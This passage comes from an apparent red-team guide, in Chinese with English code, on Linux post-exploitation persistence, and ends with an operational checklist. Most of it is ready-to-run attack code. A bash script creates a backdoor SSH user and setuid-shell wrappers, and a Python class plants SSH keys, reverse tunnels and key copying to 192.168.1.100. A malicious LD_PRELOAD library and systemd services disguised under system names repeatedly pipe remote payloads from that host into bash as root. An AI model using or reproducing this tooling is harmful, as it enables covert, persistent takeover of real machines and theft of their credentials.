chmod 600 "$SSH_DIR/id_rsa"
chmod 644 "$SSH_DIR/authorized_keys"
chown -R "$BACKDOOR_USER:$BACKDOOR_USER" "$SSH_DIR"

# 修改SSH配置以允许root登录和密钥认证
SSHD_CONFIG="/etc/ssh/sshd_config"
if [ -f "$SSHD_CONFIG" ]; then
    # 备份原始配置
    cp "$SSHD_CONFIG" "${SSHD_CONFIG}.bak"
    
    # 确保必要的配置项
    echo "PermitRootLogin yes" >> "$SSHD_CONFIG"
    echo "PubkeyAuthentication yes" >> "$SSHD_CONFIG"
    echo "PasswordAuthentication yes" >> "$SSHD_CONFIG"
    echo "PermitUserEnvironment yes" >> "$SSHD_CONFIG"
    
    # 重启SSH服务
    systemctl restart sshd || service ssh restart
    echo "[+] Modified SSH configuration"
fi

# 创建SSH后门脚本
BACKDOOR_SCRIPT="/usr/local/bin/sshd-check"
cat > "$BACKDOOR_SCRIPT" << 'EOF'
#!/bin/bash
# SSHD check script - backdoor

# 检查特定条件
if [ "$USER" = "sysadmin" ]; then
    # 设置真实UID为0
    exec /bin/bash -p
fi

# 正常sshd行为
exec /usr/sbin/sshd "$@"
EOF

chmod +x "$BACKDOOR_SCRIPT"

# 修改sshd配置使用我们的脚本
sed -i 's|/usr/sbin/sshd|/usr/local/bin/sshd-check|g' /etc/systemd/system/sshd.service 2>/dev/null

# 创建SSH环境变量后门
SSH_ENV="$SSH_DIR/environment"
cat > "$SSH_ENV" << 'EOF'
LD_PRELOAD=/tmp/backdoor.so
EOF

chmod 600 "$SSH_ENV"

# 创建SSH包装器
SSH_WRAPPER="/usr/local/bin/ssh-wrapper"
cat > "$SSH_WRAPPER" << 'EOF'
#!/bin/bash
# SSH wrapper - backdoor

# 检查特殊参数
if [[ "$*" == *"--redteam"* ]]; then
    # 直接获取shell
    /bin/bash -p
    exit 0
fi

# 正常SSH行为
exec /usr/bin/ssh "$@"
EOF

chmod +x "$SSH_WRAPPER"

# 创建systemd服务确保后门持久化
SYSTEMD_SERVICE="/etc/systemd/system/ssh-backdoor.service"
cat > "$SYSTEMD_SERVICE" << 'EOF'
[Unit]
Description=SSH Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/ssh-keygen -A
ExecStartPost=/bin/chmod 4755 /usr/bin/ssh
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ssh-backdoor.service
systemctl start ssh-backdoor.service

echo "[+] SSH backdoor setup complete"
echo "[+] Backdoor user: $BACKDOOR_USER"
echo "[+] SSH key: $SSH_DIR/id_rsa"
echo "[+] Use: ssh -i $SSH_DIR/id_rsa $BACKDOOR_USER@target"
```

#### 高级SSH持久化
```python
# ssh_advanced_persistence.py
import os
import subprocess
import tempfile
import shutil
import base64
from pathlib import Path

class SSHPersistence:
    def __init__(self):
        self.ssh_dir = os.path.expanduser("~/.ssh")
        self.backdoor_keys = []
        self.persistence_methods = []
    
    def create_backdoor_keys(self):
        """创建后门SSH密钥"""
        print("[*] Creating backdoor SSH keys...")
        
        key_types = [
            ('rsa', 4096),
            ('ed25519', None),
            ('ecdsa', 521)
        ]
        
        for key_type, key_size in key_types:
            key_name = f"backdoor_{key_type}"
            key_path = os.path.join(self.ssh_dir, key_name)
            
            # 生成密钥
            cmd = ['ssh-keygen', '-t', key_type, '-f', key_path, '-N', '', '-C', f'backdoor@{key_type}']
            if key_size:
                cmd.extend(['-b', str(key_size)])
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    self.backdoor_keys.append(key_path)
                    print(f"[+] Generated {key_type} key: {key_path}")
                else:
                    print(f"[!] Failed to generate {key_type} key: {result.stderr}")
            except subprocess.TimeoutExpired:
                print(f"[!] Key generation timed out for {key_type}")
            except FileNotFoundError:
                print(f"[!] ssh-keygen not found")
                break
        
        return self.backdoor_keys
    
    def modify_authorized_keys(self, keys=None):
        """修改authorized_keys文件"""
        if keys is None:
            keys = self.backdoor_keys
        
        auth_keys_path = os.path.join(self.ssh_dir, 'authorized_keys')
        
        # 确保authorized_keys文件存在
        if not os.path.exists(auth_keys_path):
            Path(auth_keys_path).touch(mode=0o600)
        
        # 读取现有的authorized_keys
        existing_keys = []
        if os.path.exists(auth_keys_path):
            with open(auth_keys_path, 'r') as f:
                existing_keys = f.read().strip().split('\n')
        
        # 添加后门公钥
        backdoor_keys = []
        for key_path in keys:
            pub_key_path = f"{key_path}.pub"
            if os.path.exists(pub_key_path):
                with open(pub_key_path, 'r') as f:
                    pub_key = f.read().strip()
                    backdoor_keys.append(pub_key)
        
        # 写入合并后的密钥
        all_keys = existing_keys + backdoor_keys
        with open(auth_keys_path, 'w') as f:
            f.write('\n'.join(filter(None, all_keys)))
        
        # 设置正确的权限
        os.chmod(auth_keys_path, 0o600)
        
        print(f"[+] Modified authorized_keys with {len(backdoor_keys)} backdoor keys")
        return True
    
    def create_ssh_config_backdoor(self):
        """创建SSH配置后门"""
        config_path = os.path.join(self.ssh_dir, 'config')
        
        backdoor_config = """
# RedTeam SSH backdoor configuration
Host redteam-*
    User root
    IdentityFile ~/.ssh/backdoor_rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR
    
Host *-backdoor
    User root
    IdentityFile ~/.ssh/backdoor_ed25519
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR
    ProxyCommand nc -X connect -x 192.168.1.100:8080 %h %p
"""
        
        # 追加到现有配置或创建新配置
        if os.path.exists(config_path):
            with open(config_path, 'a') as f:
                f.write(backdoor_config)
        else:
            with open(config_path, 'w') as f:
                f.write(backdoor_config)
        
        os.chmod(config_path, 0o600)
        print(f"[+] Created SSH config backdoor: {config_path}")
        return True
    
    def create_ssh_wrapper(self):
        """创建SSH包装器"""
        wrapper_content = """#!/bin/bash
# SSH wrapper with backdoor functionality

# Check for special backdoor trigger
if [[ "$*" == *"--redteam"* ]]; then
    # Remove the trigger argument
    args="${*//--redteam/}"
    # Connect using backdoor key
    exec /usr/bin/ssh -i ~/.ssh/backdoor_rsa $args
fi

# Check for backdoor hosts
if [[ "$*" == *"backdoor@"* ]] || [[ "$*" == *"redteam@"* ]]; then
    # Force use of backdoor key
    exec /usr/bin/ssh -i ~/.ssh/backdoor_ed25519 $args
fi

# Normal SSH behavior
exec /usr/bin/ssh "$@"
"""
        
        # 写入包装器脚本
        wrapper_path = os.path.join(self.ssh_dir, 'ssh-wrapper')
        with open(wrapper_path, 'w') as f:
            f.write(wrapper_content)
        
        os.chmod(wrapper_path, 0o755)
        print(f"[+] Created SSH wrapper: {wrapper_path}")
        
        # 修改PATH或使用alias
        alias_command = f"alias ssh='{wrapper_path}'"
        
        # 添加到bashrc
        bashrc_path = os.path.expanduser("~/.bashrc")
        with open(bashrc_path, 'a') as f:
            f.write(f"\n# SSH Backdoor\n{alias_command}\n")
        
        print(f"[+] Added SSH alias to {bashrc_path}")
        return True
    
    def create_systemd_ssh_backdoor(self):
        """创建systemd SSH后门服务"""
        service_content = """[Unit]
Description=SSH Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/ssh -i /root/.ssh/backdoor_rsa -R 2222:localhost:22 redteam@192.168.1.100
Restart=always
RestartSec=60
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
        
        service_path = "/etc/systemd/system/ssh-backdoor.service"
        
        try:
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # 重新加载systemd并启用服务
            subprocess.run(['systemctl', 'daemon-reload'], check=True)
            subprocess.run(['systemctl', 'enable', 'ssh-backdoor.service'], check=True)
            subprocess.run(['systemctl', 'start', 'ssh-backdoor.service'], check=True)
            
            print(f"[+] Created and started systemd SSH backdoor service")
            return True
            
        except (subprocess.CalledProcessError, PermissionError) as e:
            print(f"[!] Failed to create systemd service: {e}")
            return False
    
    def create_cron_ssh_backdoor(self):
        """创建cron SSH后门"""
        cron_content = """# SSH Backdoor Cron Jobs
# 每分钟尝试建立反向SSH连接
* * * * * /usr/bin/ssh -i ~/.ssh/backdoor_ed25519 -R 2222:localhost:22 -N -f redteam@192.168.1.100

# 每小时检查并重启SSH隧道
0 * * * * pgrep -f "ssh.*backdoor_ed25519" || /usr/bin/ssh -i ~/.ssh/backdoor_ed25519 -R 2222:localhost:22 -N -f redteam@192.168.1.100

# 每天备份SSH密钥到远程服务器
0 2 * * * scp -i ~/.ssh/backdoor_rsa ~/.ssh/backdoor_* redteam@192.168.1.100:/backup/keys/
"""
        
        # 写入crontab
        cron_path = "/etc/cron.d/ssh-backdoor"
        try:
            with open(cron_path, 'w') as f:
                f.write(cron_content)
            
            print(f"[+] Created cron SSH backdoor: {cron_path}")
            return True
            
        except PermissionError:
            print(f"[!] Permission denied creating {cron_path}")
            return False
    
    def create_ssh_env_backdoor(self):
        """创建SSH环境变量后门"""
        env_content = """# SSH Environment Variables Backdoor
LD_PRELOAD=/tmp/ssh_backdoor.so
SSH_AUTH_SOCK=/tmp/ssh_backdoor.sock
"""
        
        env_path = os.path.join(self.ssh_dir, 'environment')
        with open(env_path, 'w') as f:
            f.write(env_content)
        
        os.chmod(env_path, 0o600)
        print(f"[+] Created SSH environment backdoor: {env_path}")
        
        # 创建恶意的共享库
        so_content = """
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    if (geteuid() == 0) {
        unsetenv("LD_PRELOAD");
        system("curl http://192.168.1.100:8080/root_payload.sh | bash");
    }
}
"""
        
        so_path = "/tmp/ssh_backdoor.so"
        with open('/tmp/ssh_backdoor.c', 'w') as f:
            f.write(so_content)
        
        # 编译共享库
        try:
            subprocess.run(['gcc', '-shared', '-fPIC', '-o', so_path, '/tmp/ssh_backdoor.c'], 
                          check=True, capture_output=True)
            print(f"[+] Compiled malicious shared library: {so_path}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to compile shared library: {e}")
            return False
    
    def setup_ssh_backdoor(self):
        """设置完整的SSH后门"""
        print("[*] Setting up SSH backdoor...")
        
        # 确保SSH目录存在
        os.makedirs(self.ssh_dir, mode=0o700, exist_ok=True)
        
        # 1. 创建后门密钥
        self.create_backdoor_keys()
        
        # 2. 修改authorized_keys
        self.modify_authorized_keys()
        
        # 3. 创建SSH配置后门
        self.create_ssh_config_backdoor()
        
        # 4. 创建SSH包装器
        self.create_ssh_wrapper()
        
        # 5. 创建环境变量后门
        self.create_ssh_env_backdoor()
        
        # 6. 创建systemd服务（如果有权限）
        if os.geteuid() == 0:
            self.create_systemd_ssh_backdoor()
        
        # 7. 创建cron任务
        self.create_cron_ssh_backdoor()
        
        print("[+] SSH backdoor setup complete")
        print("[+] Backdoor methods:")
        print("    1. SSH keys in authorized_keys")
        print("    2. SSH config backdoor")
        print("    3. SSH wrapper with --redteam trigger")
        print("    4. SSH environment backdoor")
        print("    5. Systemd service (if root)")
        print("    6. Cron jobs")
        
        return True

# 使用示例
ssh_persistence = SSHPersistence()
ssh_persistence.setup_ssh_backdoor()
```

### Systemd持久化

#### Systemd服务后门
```ini
# redteam.service
[Unit]
Description=RedTeam Security Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/redteam-daemon
Restart=always
RestartSec=30
StartLimitInterval=0
User=root
Group=root
StandardOutput=null
StandardError=null
PrivateTmp=true
NoNewPrivileges=false
ProtectSystem=no
ProtectHome=no

[Install]
WantedBy=multi-user.target
```

#### Systemd服务生成器
```python
# systemd_backdoor_generator.py
import os
import subprocess
import tempfile
from pathlib import Path

class SystemdBackdoorGenerator:
    def __init__(self):
        self.service_dir = "/etc/systemd/system"
        self.user_service_dir = os.path.expanduser("~/.config/systemd/user")
        self.persistent_services = []
    
    def generate_malicious_service(self, service_name, payload_url, user_service=False):
        """生成恶意的systemd服务"""
        service_content = f"""[Unit]
Description={service_name} Security Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'curl -s {payload_url} | bash'
Restart=always
RestartSec=60
StartLimitInterval=0
StandardOutput=null
StandardError=null
PrivateTmp=true
"""
        
        if not user_service:
            service_content += """User=root
Group=root
NoNewPrivileges=false
ProtectSystem=no
ProtectHome=no
"""
        
        service_content += """
[Install]
WantedBy=multi-user.target
"""
        
        # 确定服务文件路径
        if user_service:
            os.makedirs(self.user_service_dir, exist_ok=True)
            service_path = os.path.join(self.user_service_dir, f"{service_name}.service")
        else:
            service_path = os.path.join(self.service_dir, f"{service_name}.service")
        
        try:
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            print(f"[+] Created malicious service: {service_path}")
            self.persistent_services.append(service_path)
            return service_path
            
        except PermissionError:
            print(f"[!] Permission denied creating {service_path}")
            return None
        except Exception as e:
            print(f"[!] Error creating service: {e}")
            return None
    
    def generate_timer_service(self, service_name, payload_url, schedule="*:*:0/5"):
        """生成定时器服务"""
        # 创建服务文件
        service_content = f"""[Unit]
Description={service_name} Timer Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s {payload_url} | bash'
StandardOutput=null
StandardError=null
"""
        
        service_path = os.path.join(self.service_dir, f"{service_name}.service")
        
        try:
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # 创建定时器文件
            timer_content = f"""[Unit]
Description={service_name} Timer
Requires={service_name}.service

[Timer]
OnCalendar={schedule}
Persistent=true

[Install]
WantedBy=timers.target
"""
            
            timer_path = os.path.join(self.service_dir, f"{service_name}.timer")
            with open(timer_path, 'w') as f:
                f.write(timer_content)
            
            print(f"[+] Created timer service: {service_path}")
            print(f"[+] Created timer: {timer_path}")
            
            self.persistent_services.extend([service_path, timer_path])
            return service_path, timer_path
            
        except Exception as e:
            print(f"[!] Error creating timer service: {e}")
            return None, None
    
    def generate_path_service(self, service_name, payload_path):
        """生成PATH劫持服务"""
        # 创建恶意的可执行文件
        executable_content = f"""#!/bin/bash
# Malicious {service_name} wrapper

# 执行原始payload
curl -s {payload_path} | bash

# 执行原始命令（如果存在）
if [ -f "/usr/bin/{service_name}.real" ]; then
    exec /usr/bin/{service_name}.real "$@"
else
    echo "{service_name}: command not found"
    exit 1
fi
"""
        
        # 写入到/usr/local/bin
        executable_path = f"/usr/local/bin/{service_name}"
        
        try:
            with open(executable_path, 'w') as f:
                f.write(executable_content)
            
            os.chmod(executable_path, 0o755)
            print(f"[+] Created malicious executable: {executable_path}")
            
            # 如果原始文件存在，备份它
            original_path = f"/usr/bin/{service_name}"
            if os.path.exists(original_path):
                backup_path = f"/usr/bin/{service_name}.real"
                shutil.move(original_path, backup_path)
                print(f"[+] Backed up original to: {backup_path}")
            
            return executable_path
            
        except PermissionError:
            print(f"[!] Permission denied creating {executable_path}")
            return None
        except Exception as e:
            print(f"[!] Error creating executable: {e}")
            return None
    
    def generate_user_service(self, service_name, payload_command):
        """生成用户级systemd服务"""
        service_content = f"""[Unit]
Description={service_name} User Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{payload_command}'
Restart=always
RestartSec=300
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=default.target
"""
        
        # 确保用户服务目录存在
        os.makedirs(self.user_service_dir, exist_ok=True)
        service_path = os.path.join(self.user_service_dir, f"{service_name}.service")
        
        try:
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            print(f"[+] Created user service: {service_path}")
            return service_path
            
        except Exception as e:
            print(f"[!] Error creating user service: {e}")
            return None
    
    def enable_and_start_service(self, service_path):
        """启用并启动服务"""
        service_name = os.path.basename(service_path)
        
        try:
            # 重新加载systemd
            subprocess.run(['systemctl', 'daemon-reload'], check=True, capture_output=True)
            
            # 启用服务
            subprocess.run(['systemctl', 'enable', service_name], check=True, capture_output=True)
            
            # 启动服务
            subprocess.run(['systemctl', 'start', service_name], check=True, capture_output=True)
            
            print(f"[+] Enabled and started service: {service_name}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to enable/start service {service_name}: {e}")
            return False
    
    def enable_user_service(self, service_path):
        """启用用户级服务"""
        service_name = os.path.basename(service_path)
        
        try:
            # 启用linger（允许用户服务在登录后运行）
            user = os.getenv('USER')
            subprocess.run(['loginctl', 'enable-linger', user], check=True, capture_output=True)
            
            # 启用用户服务
            subprocess.run(['systemctl', '--user', 'daemon-reload'], check=True, capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', service_name], check=True, capture_output=True)
            subprocess.run(['systemctl', '--user', 'start', service_name], check=True, capture_output=True)
            
            print(f"[+] Enabled and started user service: {service_name}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to enable user service {service_name}: {e}")
            return False
    
    def create_comprehensive_backdoor(self):
        """创建全面的systemd后门"""
        print("[*] Creating comprehensive systemd backdoor...")
        
        backdoor_components = []
        
        # 1. 系统级服务（需要root权限）
        if os.geteuid() == 0:
            # 基础恶意服务
            service1 = self.generate_malicious_service(
                "systemd-logind-helper",
                "http://192.168.1.100:8080/system_payload.sh"
            )
            if service1:
                self.enable_and_start_service(service1)
                backdoor_components.append(service1)
            
            # 定时器服务
            timer_service, timer_file = self.generate_timer_service(
                "system-update-timer",
                "http://192.168.1.100:8080/scheduled_payload.sh",
                "*:0/10"  # 每10分钟
            )
            if timer_service and timer_file:
                self.enable_and_start_service(timer_file)  # 启用定时器
                backdoor_components.extend([timer_service, timer_file])
            
            # PATH劫持
            path_backdoor = self.generate_path_service(
                "systemctl",
                "http://192.168.1.100:8080/systemctl_payload.sh"
            )
            if path_backdoor:
                backdoor_components.append(path_backdoor)
        
        # 2. 用户级服务
        user_service = self.generate_user_service(
            "gnome-keyring-daemon",
            "curl -s http://192.168.1.100:8080/user_payload.sh | bash"
        )
        if user_service:
            self.enable_user_service(user_service)
            backdoor_components.append(user_service)
        
        print(f"[+] Created {len(backdoor_components)} backdoor components")
        return backdoor_components

# 使用示例
generator = SystemdBackdoorGenerator()
components = generator.create_comprehensive_backdoor()
```

---

## 实战检查清单

### Linux提权
- [ ] SUID文件已枚举
- [ ] SUID提权已尝试
- [ ] 内核漏洞已检测
- [ ] Cron任务已枚举
- [ ] Cron提权已利用

### SSH持久化
- [ ] SSH后门密钥已创建
- [ ] authorized_keys已修改
- [ ] SSH配置后门已设置
- [ ] SSH包装器已创建
- [ ] 反向SSH隧道已配置

### Systemd持久化
- [ ] 恶意systemd服务已创建
- [ ] 定时器服务已配置
- [ ] 用户级服务已设置
- [ ] PATH劫持已部署
- [ ] 服务已启用和启动